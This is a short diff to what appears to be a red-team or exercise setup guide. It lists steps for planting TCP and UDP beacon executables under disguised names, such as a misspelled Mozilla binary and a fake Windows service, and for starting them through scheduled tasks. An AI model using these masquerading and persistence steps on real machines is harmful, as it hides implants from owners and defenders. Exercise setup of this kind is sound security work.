@@ -4,5 +4,8 @@ These require the following DNS records to be added:
 
 # Placement
 - Convert beacons to `.exe`
-- Place `.exe` beacons as described in scheduled task scripts
-- Invoke each `.exe` to get them running initially
+- Place `.exe` beacons as described in scheduled task scripts:
+    - `TCPBeacon.exe` -> `C:\Program Files\mozzilla.exe`
+    - `UDPBeacon.exe` -> `C:\Windows\accnt-service.exe`
+- `Start-ScheduledTask -TaskName mozzilla` -> Start TCP beacon
+- `Start-ScheduledTask -TaskName accnt-service` -> Start UDP beacon
